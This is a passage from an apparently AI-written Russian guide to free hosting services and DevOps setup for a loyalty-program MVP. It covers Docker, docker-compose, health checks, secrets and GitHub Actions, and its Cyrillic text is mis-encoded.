- โ **ะัััะธะน DX** (Developer Experience)
- โ React Email templates (ะบะพะผะฟะพะฝะตะฝัั React = email)
- โ ะัะพััะพะน API
- โ Webhooks ะดะปั tracking

**ะะธะฝััั:**

- โ 3,000/ะผะตััั ะผะพะถะตั ะฝะต ัะฒะฐัะธัั ะฟัะธ ัะพััะต

**ะะพะดัะพะดะธั ะดะปั:** Modern email service

***

### **ะะฐัะธะฐะฝั B: Mailgun** โญโญโญโญ

**Free Tier:**

- 5,000 emails/ะผะตััั (ะฟะตัะฒัะต 3 ะผะตัััะฐ)
- ะะพัะพะผ \$0.80/1000 emails

**ะะปััั:**

- โ 5,000 emails
- โ ะะพัะฝัะน API

**ะะธะฝััั:**

- โ ะะพัะปะต 3 ะผะตัััะตะฒ ะฟะปะฐัะฝะพ
- โ ะขัะตะฑัะตั ะฒะฐะปะธะดะฐัะธั ะดะพะผะตะฝะฐ

**ะะพะดัะพะดะธั ะดะปั:** ะัะปะธ ะฝัะถะฝะพ > 3,000

***

## ๐ฏ **ะะะฏ ะะะะะะะะะะฆะะฏ ะะะฏ EMAIL: Resend**

**ะะพัะตะผั:**

- โ 3,000/ะผะตััั ัะฒะฐัะธั ะดะปั MVP
- โ React Email (ะปะตะณะบะพ ัะพะทะดะฐะฒะฐัั ะบัะฐัะธะฒัะต ะฟะธััะผะฐ)
- โ Webhooks (ะผะพะถะตัั ะพััะปะตะถะธะฒะฐัั ะดะพััะฐะฒะบั)

***

## ๐ฑ **11. SMS PROVIDER (ะะปั ะะพััะธะธ)**

### **ะะฐัะธะฐะฝั A: SMS.RU** โญโญโญโญ

**Free Tier:**

- 5 ะฑะตัะฟะปะฐัะฝัั SMS ะฟัะธ ัะตะณะธัััะฐัะธะธ
- ะะพัะพะผ ~2-3โฝ/SMS

**ะะปััั:**

- โ ะะฐะฑะพัะฐะตั ะฒ ะะค
- โ ะัะพััะพะน API
- โ HLR-lookup

**ะะธะฝััั:**

- โ ะะพััะธ ััะฐะทั ะฟะปะฐัะฝะพ

**ะะพะดัะพะดะธั ะดะปั:** Production ะฒ ะะค

***

### **ะะฐัะธะฐะฝั B: SMSC.RU** โญโญโญ

**Free Tier:**

- 10โฝ ะฟัะธ ัะตะณะธัััะฐัะธะธ
- ~2โฝ/SMS

**ะะปััั:**

- โ ะะฐะฑะพัะฐะตั ะฒ ะะค
- โ ะะตัะตะฒะปะต ัะตะผ SMS.RU

**ะะธะฝััั:**

- โ ะกัะฐััะน UI

***

## ๐ฏ **ะะะฏ ะะะะะะะะะะฆะะฏ ะะะฏ SMS: SMS.RU**

**ะะพัะตะผั:**

- โ ะะฐะดัะถะฝัะน
- โ ะฅะพัะพัะธะน API
- โ ~200โฝ ัะฒะฐัะธั ะฝะฐ 100 SMS (ะดะปั MVP ะฝะพัะผ)

***

# ๐ **ะะขะะะะะะฏ ะะะะะะะะะะฆะะฏ: ะะะะะซะ ะะะกะะะะขะะซะ ะกะขะะ**

```
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
โ              RECOMMENDED FREE INFRASTRUCTURE             โ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโค
โ Backend API:       Fly.io (3 VM ร 256 MB)               โ
โ Frontend:          Vercel (unlimited Next.js deploys)   โ
โ PostgreSQL:        Neon.tech (3 GB storage)             โ
โ Redis:             Upstash (10,000 commands/ะดะตะฝั)       โ
โ S3 Storage:        Cloudflare R2 (10 GB + unlimited BW) โ
โ CI/CD:             GitHub Actions (2,000 min/ะผะตััั)     โ
โ Monitoring:        Better Stack (1 GB logs + uptime)    โ
โ SSL/DNS:           Cloudflare (free)                    โ
โ Email:             Resend (3,000 emails/ะผะตััั)          โ
โ SMS:               SMS.RU (~200โฝ ะดะปั ััะฐััะฐ)            โ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ

๐ฐ ะกะขะะะะะกะขะฌ: 0โฝ/ะผะตััั + ~200โฝ ะฝะฐ SMS ะดะปั ะฟะตัะฒัั 100 ะณะพััะตะน
๐ CAPACITY: ะดะพ 5,000 ะณะพััะตะน, 10,000 ััะฐะฝะทะฐะบัะธะน/ะผะตััั
```

**ะะพัะตะผั ะธะผะตะฝะฝะพ ััะพั ััะตะบ:**

1. โ **ะัั ะฑะตัะฟะปะฐัะฝะพ** (ะบัะพะผะต SMS, ะฝะพ ััะพ ะบะพะฟะตะนะบะธ)
2. โ **Always-on** (Fly.io ะฝะต ัะฟะธั, ะบัะธัะธัะฝะพ ะดะปั Telegram bot)
3. โ **Production-ready** (ะฝะต hobby tier, ะฐ ัะตะฐะปัะฝัะน production)
4. โ **ะะฐัััะฐะฑะธััะตะผะพ** (ะปะตะณะบะพ ะฟะตัะตะนัะธ ะฝะฐ ะฟะปะฐัะฝัะต ะฟะปะฐะฝั ะฟัะธ ัะพััะต)
5. โ **Modern DX** (ัะพัะพัะธะน Developer Experience)

ะะพัะพะฒ ะดะตัะฐะปะธะทะธัะพะฒะฐัั **Docker setup + CI/CD ะบะพะฝัะธะณััะฐัะธั** ะดะปั ััะพะณะพ ััะตะบะฐ! ๐

---

# ะัะธะฝะธะผะฐั ัะฒะพะธ ะฒะฐัะธะฐะฝัั ะฟะพ ััะพะผั ะฒะพะฟัะพัั

ะัะปะธัะฝะพ! ๐ ะขะตะฟะตัั ะดะตัะฐะปะธะทะธััะตะผ **Infrastructure \& DevOps** ะดะปั ะฒัะฑัะฐะฝะฝะพะณะพ ััะตะบะฐ. ะะฐะดะฐะผ **30+ ะฒะพะฟัะพัะพะฒ** ั ะบะพะฝะบัะตัะฝัะผะธ ัะตัะตะฝะธัะผะธ ะธ ะบะพะดะพะผ.

***

# ๐ง **INFRASTRUCTURE \& DEVOPS: 35+ ะะะขะะะฌะะซะฅ ะะะะะะกะะ**

## ๐ณ **ะะะะ 1: DOCKER \& CONTAINERIZATION (8 ะฒะพะฟัะพัะพะฒ)**

### **1๏ธโฃ Dockerfile ะดะปั Backend: Multi-stage ะธะปะธ Single-stage?**

**ะะะะะะก:** ะะฐะบ ะพัะณะฐะฝะธะทะพะฒะฐัั Dockerfile ะดะปั NestJS backend?

**ะะฐัะธะฐะฝัั:**

**A) Single-stage (ะฟัะพััะพะน)**

```dockerfile
FROM node:20-alpine
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production
COPY . .
RUN npm run build
CMD ["node", "dist/main.js"]
```

**B) Multi-stage (ะพะฟัะธะผะธะทะธัะพะฒะฐะฝะฝัะน)** โญ

```dockerfile
# Stage 1: Dependencies
FROM node:20-alpine AS deps
WORKDIR /app
COPY package*.json ./
RUN npm ci

# Stage 2: Build
FROM node:20-alpine AS builder
WORKDIR /app
COPY --from=deps /app/node_modules ./node_modules
COPY . .
RUN npm run build
RUN npm prune --production

# Stage 3: Production
FROM node:20-alpine AS runner
WORKDIR /app
ENV NODE_ENV=production
COPY --from=builder /app/dist ./dist
COPY --from=builder /app/node_modules ./node_modules
COPY --from=builder /app/package.json ./
USER node
EXPOSE 3000
CMD ["node", "dist/main.js"]
```

**C) Multi-stage ั ะบััะธัะพะฒะฐะฝะธะตะผ ะทะฐะฒะธัะธะผะพััะตะน**

```dockerfile
# + ะดะพะฑะฐะฒะปัะตะผ npm cache ะผะตะถะดั stages
RUN npm ci --cache /tmp/.npm
```

**D) Distroless image (ะผะธะฝะธะผะฐะปัะฝัะน ัะฐะทะผะตั)**

```dockerfile
FROM gcr.io/distroless/nodejs20-debian11
COPY --from=builder /app/dist ./dist
CMD ["dist/main.js"]
```


***

## ๐ฏ **ะะะฏ ะะะะะะะะะะฆะะฏ: B) Multi-stage**

**ะะพัะตะผั:**

- โ ะะฐะทะผะตั ะพะฑัะฐะทะฐ ~150 MB (vs 500+ MB ะฒ single-stage)
- โ ะะต ะฒะบะปััะฐะตะผ dev dependencies ะฒ production
- โ ะะตะทะพะฟะฐัะฝะพััั (ะทะฐะฟััะบะฐะตะผ ะพั user `node`, ะฝะต `root`)
- โ ะััะธัะพะฒะฐะฝะธะต ัะปะพัะฒ (ะฑัััััะน rebuild ะฟัะธ ะธะทะผะตะฝะตะฝะธะธ ะบะพะดะฐ)

**ะะพะปะฝัะน Dockerfile ะดะปั Backend:**

```dockerfile
# apps/backend/Dockerfile
FROM node:20-alpine AS deps
WORKDIR /app
COPY package*.json ./
COPY package-lock.json ./
RUN npm ci --only=production

# Build stage
FROM node:20-alpine AS builder
WORKDIR /app
COPY package*.json ./
COPY package-lock.json ./
RUN npm ci
COPY . .
RUN npm run build
RUN npm prune --production

# Production stage
FROM node:20-alpine AS runner
WORKDIR /app
ENV NODE_ENV=production

# Security: run as non-root
RUN addgroup --system --gid 1001 nodejs
RUN adduser --system --uid 1001 nestjs
USER nestjs

COPY --from=builder --chown=nestjs:nodejs /app/dist ./dist
COPY --from=builder --chown=nestjs:nodejs /app/node_modules ./node_modules
COPY --from=builder --chown=nestjs:nodejs /app/package.json ./

EXPOSE 3000

HEALTHCHECK --interval=30s --timeout=3s --start-period=40s --retries=3 \
  CMD node -e "require('http').get('http://localhost:3000/health', (r) => {process.exit(r.statusCode === 200 ? 0 : 1)})"

CMD ["node", "dist/main.js"]
```


***

### **2๏ธโฃ Dockerfile ะดะปั Worker: ะัะดะตะปัะฝัะน ะพะฑัะฐะท ะธะปะธ ัะพั ะถะต?**

**ะะะะะะก:** Worker (BullMQ processor) ะธัะฟะพะปัะทัะตั ัะพั ะถะต ะบะพะด ััะพ ะธ API. ะัะดะตะปัะฝัะน Dockerfile?

**ะะฐัะธะฐะฝัั:**

**A) ะขะพั ะถะต Dockerfile, ัะฐะทะฝัะต CMD** โญ

```dockerfile
# ะัะฟะพะปัะทัะตะผ ัะพั ะถะต ะพะฑัะฐะท, ะฝะพ ะฒ fly.toml ัะฐะทะฝัะต ะฟัะพัะตััั
FROM node:20-alpine AS runner
# ... (ัะพั ะถะต Dockerfile)

# ะะฐะฟััะบ ัะตัะตะท env var
CMD ["sh", "-c", "node dist/main.js --$PROCESS_TYPE"]
```

**B) ะัะดะตะปัะฝัะน Dockerfile ะดะปั worker**

```dockerfile
# apps/worker/Dockerfile
FROM backend:latest
CMD ["node", "dist/worker.js"]
```

**C) ะะดะธะฝ ะพะฑัะฐะท, ัะฐะทะฝัะต entrypoint ัะบัะธะฟัั**

```dockerfile
COPY scripts/start-api.sh ./
COPY scripts/start-worker.sh ./
CMD ["./start-api.sh"]  # override ะฒ fly.toml
```


***

## ๐ฏ **ะะะฏ ะะะะะะะะะะฆะะฏ: A) ะขะพั ะถะต Dockerfile, ัะฐะทะฝัะต ะฟัะพัะตััั ะฒ fly.toml**

**ะะพัะตะผั:**

- โ ะะดะธะฝ ะพะฑัะฐะท โ ะฟัะพัะต ะฟะพะดะดะตัะถะบะฐ
- โ ะะดะธะฝ build โ ะฑััััะตะต CI/CD
- โ Worker ะธ API ะธัะฟะพะปัะทััั ะพะดะฝั ะบะพะดะพะฒัั ะฑะฐะทั

**ะะตะฐะปะธะทะฐัะธั:**

```typescript
// apps/backend/src/main.ts
async function bootstrap() {
  const processType = process.env.PROCESS_TYPE || 'api';
  
  if (processType === 'api') {
    // ะะฐะฟััะบะฐะตะผ HTTP server
    const app = await NestFactory.create(AppModule);
    await app.listen(3000);
  } else if (processType === 'worker') {
    // ะะฐะฟััะบะฐะตะผ ัะพะปัะบะพ Worker
    const app = await NestFactory.createApplicationContext(WorkerModule);
    // Worker ะฐะฒัะพะผะฐัะธัะตัะบะธ ะฟะพะดะฟะธััะฒะฐะตััั ะฝะฐ ะพัะตัะตะดะธ BullMQ
  } else if (processType === 'cron') {
    // ะะฐะฟััะบะฐะตะผ ัะพะปัะบะพ Cron jobs
    const app = await NestFactory.createApplicationContext(CronModule);
  }
}
bootstrap();
```

**fly.toml:**

```toml
# Backend API
[processes]
api = "node dist/main.js"
worker = "node dist/main.js"
cron = "node dist/main.js"

[env]
api.PROCESS_TYPE = "api"
worker.PROCESS_TYPE = "worker"
cron.PROCESS_TYPE = "cron"
```


***

### **3๏ธโฃ Docker Compose ะดะปั ะปะพะบะฐะปัะฝะพะน ัะฐะทัะฐะฑะพัะบะธ: ะัะถะตะฝ ะปะธ?**

**ะะะะะะก:** ะัะฟะพะปัะทะพะฒะฐัั Docker Compose ะดะปั dev ะพะบััะถะตะฝะธั ะธะปะธ ะทะฐะฟััะบะฐัั PostgreSQL/Redis ะพัะดะตะปัะฝะพ?

**ะะฐัะธะฐะฝัั:**

**A) ะะพะปะฝัะน docker-compose (Backend + PostgreSQL + Redis + Frontend)** โญ

```yaml
version: '3.9'
services:
  postgres:
    image: postgres:15-alpine
    environment:
      POSTGRES_DB: max_loyalty
      POSTGRES_USER: dev
      POSTGRES_PASSWORD: dev
    ports:
      - "5432:5432"
    volumes:
      - postgres_data:/var/lib/postgresql/data
  
  redis:
    image: redis:7-alpine
    ports:
      - "6379:6379"
  
  backend:
    build:
      context: ./apps/backend
      dockerfile: Dockerfile
      target: development
    environment:
      DATABASE_URL: postgresql://dev:dev@postgres:5432/max_loyalty
      REDIS_URL: redis://redis:6379
    ports:
      - "3000:3000"
    volumes:
      - ./apps/backend:/app
      - /app/node_modules
    depends_on:
      - postgres
      - redis
  
  frontend:
    build:
      context: ./apps/frontend
      dockerfile: Dockerfile.dev
    ports:
      - "3001:3000"
    volumes:
      - ./apps/frontend:/app
      - /app/node_modules
    environment:
      NEXT_PUBLIC_API_URL: http://localhost:3000
```

**B) ะขะพะปัะบะพ ะธะฝััะฐััััะบัััะฐ (PostgreSQL + Redis), Backend/Frontend ะปะพะบะฐะปัะฝะพ**

```yaml
version: '3.9'
services:
  postgres:
    image: postgres:15-alpine
    # ...
  redis:
    image: redis:7-alpine
    # ...
```

**C) ะะตะท Docker Compose (ะฒัั ะปะพะบะฐะปัะฝะพ ัะตัะตะท npm)**

***

## ๐ฏ **ะะะฏ ะะะะะะะะะะฆะะฏ: B) ะขะพะปัะบะพ ะธะฝััะฐััััะบัััะฐ ะฒ Docker**

**ะะพัะตะผั:**

- โ PostgreSQL + Redis ะฒ Docker โ ะพะดะธะฝะฐะบะพะฒัะต ะฒะตััะธะธ ะฝะฐ ะฒัะตั dev ะผะฐัะธะฝะฐั
- โ Backend/Frontend ะทะฐะฟััะบะฐะตะผ ะปะพะบะฐะปัะฝะพ (`npm run dev`) โ hot reload ัะฐะฑะพัะฐะตั ะฑััััะตะต
- โ ะะต ะฝัะถะฝะพ ะฟะตัะตัะพะฑะธัะฐัั ะพะฑัะฐะทั ะฟัะธ ะธะทะผะตะฝะตะฝะธะธ ะบะพะดะฐ

**docker-compose.dev.yml:**

```yaml
version: '3.9'

services:
  postgres:
    image: postgres:15-alpine
    container_name: max-loyalty-postgres
    restart: unless-stopped
    environment:
      POSTGRES_DB: max_loyalty_dev
      POSTGRES_USER: dev
      POSTGRES_PASSWORD: dev_password_change_me
    ports:
      - "5432:5432"
    volumes:
      - postgres_dev_data:/var/lib/postgresql/data
      - ./scripts/init-db.sql:/docker-entrypoint-initdb.d/init.sql
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U dev -d max_loyalty_dev"]
      interval: 10s
      timeout: 5s
      retries: 5

  redis:
    image: redis:7-alpine
    container_name: max-loyalty-redis
    restart: unless-stopped
    ports:
      - "6379:6379"
    volumes:
      - redis_dev_data:/data
    healthcheck:
      test: ["CMD", "redis-cli", "ping"]
      interval: 10s
      timeout: 3s
      retries: 5

  # MinIO ะดะปั ะปะพะบะฐะปัะฝะพะณะพ S3 (ะฒะผะตััะพ Cloudflare R2)
  minio:
    image: minio/minio:latest
    container_name: max-loyalty-minio
    command: server /data --console-address ":9001"
    ports:
      - "9000:9000"
      - "9001:9001"
    environment:
      MINIO_ROOT_USER: minioadmin
      MINIO_ROOT_PASSWORD: minioadmin
    volumes:
      - minio_dev_data:/data
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost:9000/minio/health/live"]
      interval: 30s
      timeout: 20s
      retries: 3

volumes:
  postgres_dev_data:
  redis_dev_data:
  minio_dev_data:
```

**ะะฐะฟััะบ:**

```bash
# ะกัะฐัั ะธะฝััะฐััััะบัััั
docker-compose -f docker-compose.dev.yml up -d

# Backend ะปะพะบะฐะปัะฝะพ
cd apps/backend
npm run dev

# Frontend ะปะพะบะฐะปัะฝะพ
cd apps/frontend
npm run dev
```


***

### **4๏ธโฃ .dockerignore: ะงัะพ ะธัะบะปััะฐัั?**

**ะะะะะะก:** ะงัะพ ะดะพะฑะฐะฒะธัั ะฒ .dockerignore ััะพะฑั ััะบะพัะธัั build?

**ะะะ ะะะจะะะะ:**

```dockerignore
# apps/backend/.dockerignore
node_modules
npm-debug.log
dist
coverage
.git
.gitignore
.env
.env.*
README.md
.vscode
.idea
*.md
.DS_Store
Thumbs.db
test
*.test.ts
*.spec.ts
.github
Dockerfile
docker-compose*.yml
```


***

### **5๏ธโฃ ะะฑัะฐะทั ะดะปั ัะฐะทะฝัั ะฐััะธัะตะบััั (ARM64 vs AMD64)?**

**ะะะะะะก:** Fly.io ะฟะพะดะดะตัะถะธะฒะฐะตั ะธ ARM64 ะธ AMD64. ะกะพะฑะธัะฐัั ะพะฑะฐ?

**ะะฐัะธะฐะฝัั:**

**A) ะขะพะปัะบะพ AMD64** (ะฟัะพัะต)

```dockerfile
FROM --platform=linux/amd64 node:20-alpine
```

**B) Multi-platform build** โญ (ะฟะพะดะดะตัะถะบะฐ M1 Mac + production)

```bash
docker buildx build --platform linux/amd64,linux/arm64 -t backend:latest .
```


***

## ๐ฏ **ะะะฏ ะะะะะะะะะะฆะะฏ: B) Multi-platform**

**ะะพัะตะผั:**

- โ ะะฐะฑะพัะฐะตั ะฝะฐ M1/M2 Mac (ARM64) ะฑะตะท Rosetta
- โ Fly.io ะฐะฒัะพะผะฐัะธัะตัะบะธ ะฒัะฑะตัะตั ะฝัะถะฝัั ะฐััะธัะตะบัััั
- โ Node 20 alpine ะฟะพะดะดะตัะถะธะฒะฐะตั ะพะฑะต ะฐััะธัะตะบัััั

**ะ GitHub Actions:**

```yaml
- name: Build and push Docker image
  uses: docker/build-push-action@v5
  with:
    platforms: linux/amd64,linux/arm64
    push: true
    tags: |
      ghcr.io/${{ github.repository }}/backend:latest
      ghcr.io/${{ github.repository }}/backend:${{ github.sha }}
```


***

### **6๏ธโฃ Health check endpoint: ะะฐะบ ะฟัะพะฒะตัััั ะทะดะพัะพะฒัะต ะบะพะฝัะตะนะฝะตัะฐ?**

**ะะะะะะก:** ะงัะพ ะดะพะปะถะตะฝ ะฟัะพะฒะตัััั `/health` endpoint?

**ะะฐัะธะฐะฝัั:**

**A) ะัะพััะพะน ping (ัะพะปัะบะพ HTTP 200)**

```typescript
@Get('health')
health() {
  return { status: 'ok' };
}
```

**B) Database + Redis check** โญ

```typescript
@Get('health')
async health() {
  // ะัะพะฒะตััะตะผ DB
  await this.prisma.$queryRaw`SELECT 1`;
  
  // ะัะพะฒะตััะตะผ Redis
  await this.redis.ping();
  
  return {
    status: 'ok',
    timestamp: new Date().toISOString(),
    uptime: process.uptime()
  };
}
```

**C) ะะตัะฐะปัะฝัะน health check (database, redis, s3, external APIs)**

```typescript
@Get('health')
async health() {
  const checks = await Promise.allSettled([
    this.checkDatabase(),
    this.checkRedis(),
    this.checkS3(),
    this.checkPOSConnection()
  ]);
  
  return {
    status: checks.every(c => c.status === 'fulfilled') ? 'ok' : 'degraded',
    checks: {
      database: checks[0].status,
      redis: checks[1].status,
      s3: checks[2].status,
      pos: checks[3].status
    }
  };
}
```


***

## ๐ฏ **ะะะฏ ะะะะะะะะะะฆะะฏ: C) ะะตัะฐะปัะฝัะน ั grace period**

**ะะพัะตะผั:**

- โ ะะธะดะธะผ ะบะฐะบะพะน ัะตัะฒะธั ัะฟะฐะป
- โ ะะพะถะตะผ routing ะฝะฐ ะทะดะพัะพะฒัะต ะธะฝััะฐะฝัั
- โ Better Stack ะผะพะถะตั ะฟะพะบะฐะทะฐัั ะดะตัะฐะปะธ

**ะะตะฐะปะธะทะฐัะธั:**

```typescript
// apps/backend/src/health/health.controller.ts
import { Controller, Get } from '@nestjs/common';
import { PrismaService } from '@/database/prisma.service';
import { RedisService } from '@/redis/redis.service';
import { S3Service } from '@/storage/s3.service';

@Controller('health')
export class HealthController {
  constructor(
    private prisma: PrismaService,
    private redis: RedisService,
    private s3: S3Service,
  ) {}

  @Get()
  async check() {
    const checks = {
      database: await this.checkDatabase(),
      redis: await this.checkRedis(),
      s3: await this.checkS3(),
    };

    const allHealthy = Object.values(checks).every(c => c.status === 'ok');

    return {
      status: allHealthy ? 'ok' : 'degraded',
      timestamp: new Date().toISOString(),
      uptime: process.uptime(),
      checks,
    };
  }

  private async checkDatabase() {
    try {
      await this.prisma.$queryRaw`SELECT 1`;
      return { status: 'ok', latency: 0 }; // ะผะพะถะฝะพ ะทะฐะผะตัะธัั latency
    } catch (error) {
      return { status: 'error', message: error.message };
    }
  }

  private async checkRedis() {
    try {
      const start = Date.now();
      await this.redis.ping();
      return { status: 'ok', latency: Date.now() - start };
    } catch (error) {
      return { status: 'error', message: error.message };
    }
  }

  private async checkS3() {
    try {
      // ะัะพะฒะตััะตะผ ะดะพัััะฟะฝะพััั bucket
      await this.s3.headBucket({ Bucket: process.env.S3_BUCKET });
      return { status: 'ok' };
    } catch (error) {
      return { status: 'error', message: error.message };
    }
  }

  // Liveness probe (ะดะปั Kubernetes/Fly.io)
  @Get('live')
  liveness() {
    return { status: 'ok' };
  }

  // Readiness probe (ะณะพัะพะฒ ะปะธ ะฟัะธะฝะธะผะฐัั ััะฐัะธะบ)
  @Get('ready')
  async readiness() {
    const dbCheck = await this.checkDatabase();
    if (dbCheck.status === 'error') {
      throw new Error('Database not ready');
    }
    return { status: 'ok' };
  }
}
```

**Dockerfile healthcheck:**

```dockerfile
HEALTHCHECK --interval=30s --timeout=3s --start-period=40s --retries=3 \
  CMD node -e "require('http').get('http://localhost:3000/health/live', (r) => {process.exit(r.statusCode === 200 ? 0 : 1)})"
```


***

### **7๏ธโฃ Graceful shutdown: ะะฐะบ ะบะพััะตะบัะฝะพ ะพััะฐะฝะฐะฒะปะธะฒะฐัั ะบะพะฝัะตะนะฝะตั?**

**ะะะะะะก:** ะะฐะบ ะพะฑัะฐะฑะพัะฐัั SIGTERM ะฟัะธ ะพััะฐะฝะพะฒะบะต ะบะพะฝัะตะนะฝะตัะฐ (ะฝะต ะฟะพัะตัััั ะทะฐะฟัะพัั)?

**ะะะ ะะะจะะะะ:**

```typescript
// apps/backend/src/main.ts
import { NestFactory } from '@nestjs/core';
import { AppModule } from './app.module';

async function bootstrap() {
  const app = await NestFactory.create(AppModule);
  
  // Enable graceful shutdown
  app.enableShutdownHooks();
  
  await app.listen(3000);
  
  // Handle SIGTERM (ะพั Docker/Kubernetes)
  process.on('SIGTERM', async () => {
    console.log('SIGTERM received, closing HTTP server...');
    await app.close();
    console.log('HTTP server closed');
    process.exit(0);
  });
  
  // Handle SIGINT (Ctrl+C ะปะพะบะฐะปัะฝะพ)
  process.on('SIGINT', async () => {
    console.log('SIGINT received, closing HTTP server...');
    await app.close();
    process.exit(0);
  });
}
bootstrap();
```

**Fly.io ะบะพะฝัะธะณััะฐัะธั:**

```toml
# fly.toml
[deploy]
  strategy = "rolling"
  wait_timeout = "5m"

[[services]]
  internal_port = 3000
  protocol = "tcp"
  
  # Grace period ะฟะตัะตะด ัะพััะธัะพะฒะฐะฝะฝัะผ kill
  [services.concurrency]
    type = "connections"
    hard_limit = 1000
    soft_limit = 800
  
  # ะัะตะผั ะฝะฐ graceful shutdown
  kill_timeout = 30
```


***

### **8๏ธโฃ Secrets ะฒ Docker: ะะฐะบ ะฟะตัะตะดะฐะฒะฐัั ััะฒััะฒะธัะตะปัะฝัะต ะดะฐะฝะฝัะต?**

**ะะะะะะก:** ะะฐะบ ะฟะตัะตะดะฐะฒะฐัั DATABASE_URL, API ะบะปััะธ ะฒ ะบะพะฝัะตะนะฝะตั ะฑะตะทะพะฟะฐัะฝะพ?

**ะะฐัะธะฐะฝัั:**

**A) Environment variables (ัะตัะตะท fly.toml)** โญ

```bash
fly secrets set DATABASE_URL="postgresql://..."
fly secrets set REDIS_URL="redis://..."
fly secrets set JWT_SECRET="..."
```

**B) Docker secrets (ะดะปั Swarm/Kubernetes)**

```yaml
secrets:
  db_password:
    file: ./secrets/db_password.txt
```

**C) .env ัะฐะนะป ะฒ production (โ ะะ ะะะะะะะะะฃะะขะกะฏ)**

***

## ๐ฏ **ะะะฏ ะะะะะะะะะะฆะะฏ: A) Fly.io secrets**

**ะะพัะตะผั:**

- โ Encrypted at rest
- โ ะะต ะฟะพะฟะฐะดะฐัั ะฒ git
- โ ะะต ะฒะธะดะฝั ะฒ ะปะพะณะฐั
- โ ะะพะถะฝะพ ัะพัะธัะพะฒะฐัั ะฑะตะท rebuild

**Setup:**

```bash
# Production secrets
fly secrets set \
  DATABASE_URL="postgresql://user:pass@neon.tech:5432/db" \
  REDIS_URL="redis://upstash.com:6379" \
  JWT_SECRET="$(openssl rand -base64 32)" \
  JWT_REFRESH_SECRET="$(openssl rand -base64 32)" \
  CLOUDFLARE_R2_ACCESS_KEY="..." \
  CLOUDFLARE_R2_SECRET_KEY="..." \
  RESEND_API_KEY="..." \
  SMS_RU_API_KEY="..." \
  BETTER_STACK_TOKEN="..."

# Staging secrets (ะพัะดะตะปัะฝะพะต ะฟัะธะปะพะถะตะฝะธะต)
fly secrets set -a max-loyalty-staging \
  DATABASE_URL="..." \
  # ...
```


***

## โ๏ธ **ะะะะ 2: CI/CD PIPELINE (7 ะฒะพะฟัะพัะพะฒ)**

### **9๏ธโฃ GitHub Actions: ะกะบะพะปัะบะพ workflow ัะฐะนะปะพะฒ?**

**ะะะะะะก:** ะะดะธะฝ workflow ะดะปั ะฒัะตะณะพ ะธะปะธ ัะฐะทะดะตะปะธัั ะฟะพ ะทะฐะดะฐัะฐะผ?

**ะะฐัะธะฐะฝัั:**

**A) ะะดะธะฝ ัะฐะนะป `.github/workflows/main.yml`** (ะฒัั ะฒ ะพะดะฝะพะผ)

**B) ะะฐะทะดะตะปะตะฝะธะต ะฟะพ ะทะฐะดะฐัะฐะผ** โญ

```
.github/workflows/
โโโ test.yml          # ะขะตััั ะฝะฐ ะบะฐะถะดัะน PR
โโโ deploy-backend.yml    # ะะตะฟะปะพะน backend
โโโ deploy-frontend.yml   # ะะตะฟะปะพะน frontend
โโโ cron-backup.yml      # ะะถะตะดะฝะตะฒะฝัะน ะฑัะบะฐะฟ
```

**C) Monorepo workflow (ะพะดะธะฝ ัะฐะนะป, ะฝะพ matrix ะดะปั apps)**

***

## ๐ฏ **ะะะฏ ะะะะะะะะะะฆะะฏ: B) ะะฐะทะดะตะปะตะฝะธะต ะฟะพ ะทะฐะดะฐัะฐะผ**

**ะะพัะตะผั:**

- โ ะะตะทะฐะฒะธัะธะผัะต ะดะตะฟะปะพะธ (frontend ะฝะต ะถะดัั backend)
- โ ะัะพัะต ะดะตะฑะฐะถะธัั
- โ ะะพะถะฝะพ ัะฐะทะฝัะต ััะธะณะณะตัั

**ะกัััะบัััะฐ:**

```yaml
# .github/workflows/test.yml
name: Test

on:
  pull_request:
    branches: [main, develop]
  push:
    branches: [main, develop]

jobs:
  test-backend:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'
      
      - name: Install dependencies
        run: npm ci
      
      - name: Lint
        run: npm run lint
      
      - name: Type check
        run: npm run type-check
      
      - name: Unit tests
        run: npm run test:unit
      
      - name: Integration tests
        run: npm run test:integration
        env:
          DATABASE_URL: postgresql://test:test@localhost:5432/test
          REDIS_URL: redis://localhost:6379
      
      - name: Upload coverage
        uses: codecov/codecov-action@v3
        with:
          files: ./coverage/lcov.info

  test-frontend:
    runs-on: ubuntu-latest
    steps:
      # ... ะฐะฝะฐะปะพะณะธัะฝะพ ะดะปั frontend
```

```yaml
# .github/workflows/deploy-backend.yml
name: Deploy Backend

on:
  push:
    branches: [main]
    paths:
      - 'apps/backend/**'
      - 'packages/**'
      - '.github/workflows/deploy-backend.yml'

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Setup Fly.io
        uses: superfly/flyctl-actions/setup-flyctl@master
      
      - name: Deploy to Fly.io
        run: flyctl deploy --remote-only
        working-directory: apps/backend
        env:
          FLY_API_TOKEN: ${{ secrets.FLY_API_TOKEN }}
      
      - name: Notify deployment
        uses: sarisia/actions-status-discord@v1
        if: always()
        with:
          webhook: ${{ secrets.DISCORD_WEBHOOK }}
          status: ${{ job.status }}
```

```yaml
# .github/workflows/deploy-frontend.yml
name: Deploy Frontend

on:
  push:
    branches: [main]
    paths:
      - 'apps/frontend/**'
      - '.github/workflows/deploy-frontend.yml'

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Deploy to Vercel
        uses: amondnet/vercel-action@v25
        with:
          vercel-token: ${{ secrets.VERCEL_TOKEN }}
          vercel-org-id: ${{ secrets.VERCEL_ORG_ID }}
          vercel-project-id: ${{ secrets.VERCEL_PROJECT_ID }}
          vercel-args: '--prod'
          working-directory: apps/frontend
```


***

### **1๏ธโฃ0๏ธโฃ Database migrations ะฒ CI/CD: ะะพะณะดะฐ ะทะฐะฟััะบะฐัั?**

